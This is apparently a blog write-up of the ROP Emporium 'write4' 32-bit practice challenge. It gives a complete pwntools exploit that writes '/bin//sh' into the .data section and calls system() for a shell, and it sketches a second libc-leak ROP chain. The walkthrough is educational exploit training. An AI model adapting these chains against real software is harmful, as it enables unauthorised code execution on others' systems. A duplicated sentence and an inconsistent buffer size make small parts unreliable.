---
layout: post
title: ROP Emporium Challenge 3 - Write4 (32 bits)
excerpt_separator: <!--more-->
---

Description: *We'll be looking for gadgets that let us write a value to memory such as mov [reg], reg.*
<!--more-->

# write432

Link: https://ropemporium.com/challenge/write4.html


----------------------

## Approach 1: Write-What-Where Gadgets

### 1. Calculating RIP overwrite offset

First, we check the offset is still the same sending 41 "A" characters:

![a](images/Screenshot_1.jpg)



### 2. Write-what-where gadgets

"Frequently, you’ll want to use a ROP chain in order to write something into memory. You may want to place the string “/bin/sh” into memory in order to use it as a parameter for system(), or perhaps overwrite a Global Offset Table (GOT) entry in order to redirect execution. (...). 

A common write-what-where gadget is mov <[register]>, <register>. In Intel syntax, this means that the contents of the second register will be placed into the dereferenced pointer stored in the first register. Note the square brackets surrounding the register name, as the square brackets indicate dereferencing.

If you know you’ll want to write something to memory at some point, you may want to start by locating these write-what-where gadgets and then determining if you can control those registers through the use of other gadgets." ([source](https://trustfoundry.net/basic-rop-techniques-and-tricks/))

```
mov <[register]>, <register>

mov <[pointer to a writable area of memory]>, <contents you want to write into memory>
```

We can find all these gadgets using:

```
python /root/tools/ROPgadget/ROPgadget.py --binary write432 | grep mov | grep "\["
```

![a](images/Screenshot_2.jpg)

We have these *Write-What-Where* gadgets:

- *mov dword ptr [edi], ebp* (0x08048670) -> **writewhatwhere = 0x08048670**

Then we search for gadgets that could control EDI and EBP:

- *pop edi ; pop ebp ; ret* (0x080486da) -> **pop_edi_pop_ebp = 0x080486da**

![a](images/Screenshot_3.jpg)



### 3. Writable memory areas

Next we need to figure out where to write in memory. The best option would be the .data segment. Let’s get the address of the “.data” section in the binary. Also, the .bss section is writable:

![a](images/Screenshot_4.jpg)

Let us take as writable memory address the address 0x804a028, where .data starts -> **writable_memory = 0x804a028**


```
mov [edi], ebp

mov [0x804a028], "/bin//sh"
```



### 4. Creating the exploit

As we are working with 32 bits, we will first send "/bin" and then "//sh" (4 characters each):

```
rop += p32(pop_edi_pop_ebp) + p32(writable_memory) + "/bin" 
rop += p32(writewhatwhere)
rop += p32(pop_edi_pop_ebp) + p32(writable_memory+4) + "//sh"
rop += p32(writewhatwhere)
```

After this, knowing the string "/bin//sh" will be located in *writable_memory*, we can make the same that in the previous challenge "split32": 

```
rop += p32(system) + p32(exit) + p32(writable_memory)
```

### 5. Final exploit

Finally, the exploit is:

```
from pwn import *

context(arch='i386', os='linux')
binary_name = 'write432'
p = process('./'+binary_name)
elf =  ELF(binary_name)

system = elf.sym["system"] 
log.info("System address (.plt): " + hex(system))
pop_ebp         = 0x080486db
pop_edi_pop_ebp = 0x080486da
writewhatwhere  = 0x08048670
writable_memory = 0x804a028
exit            = 0x080484e8

rop =  "A"*44
rop += p32(pop_edi_pop_ebp) + p32(writable_memory) + "/bin" 
rop += p32(writewhatwhere)
rop += p32(pop_edi_pop_ebp) + p32(writable_memory+4) + "//sh"
rop += p32(writewhatwhere)
rop += p32(system) + p32(exit) + p32(writable_memory)

p.recvuntil("> ")
p.send(rop)
p.interactive()
```

And it works!:

![a](images/Screenshot_5.jpg)


--------------



## Approach 2: Libc leakage approach

The second approach is leaking an address of libc to calculate libc base address and then make a system("/bin/sh") call

```
payload = [140 bytes buffer] + junk + [main()] + [puts@got]
```


### Rop 1: Leaking puts address

First we will use the "puts()" function, which is present in the 

First we will use the "puts()" function, which is present in the binary, to print the address in the section .got.plt of a function. In this case we will print the address of the same function "puts()", calling it using its address in .plt section and setting its address in .got.plt as the first and only argument if the function.

```
OFFSET = "A"*44
PUTS_PLT = elf.plt['puts']
MAIN_PLT = elf.symbols['main']
puts_GOT = elf.got["puts"]

rop1 = OFFSET + p32(PUTS_PLT) + p32(MAIN_PLT) + p32(puts_GOT)
```


### Calculating libc base address

We will take the output, where the address has been printed, and will parse it. Then, knowing the offset of the "puts" function, we can calculate the base address of libc.

```
leak = u32(p.recvline()[:4])
libc.address = leak - libc.symbols["puts"]
```

### Rop 2: system("/bin/sh")

Finally, we will call the function "system" in the libc file, given that we already know the base address and the offset of the functions in these files are constant (they change between types of libc but the offset of the functions in the same libc file is the same). We will search for the string "/bin/sh" and set it as the first and only argument of the "system()" function.

```
BINSH = next(libc.search("/bin/sh"))
SYSTEM = libc.sym["system"]
EXIT = "\x12"*4 # this can be anything

rop2 = OFFSET + p32(SYSTEM) + EXIT + p32(BINSH)
```


--------------

References:

- Write in memory: https://www.exploit-db.com/docs/english/28479-return-oriented-programming-(rop-ftw).pdf. 

- About wruite-what-where: https://trustfoundry.net/basic-rop-techniques-and-tricks/

- Another write-what-where exploit: https://failingsilently.wordpress.com/2017/12/14/rop-chain-shell/

- Libc leakage: https://medium.com/hackstreetboys/encryptctf-2019-pwn-write-up-4-of-5-6fc5779d51fa

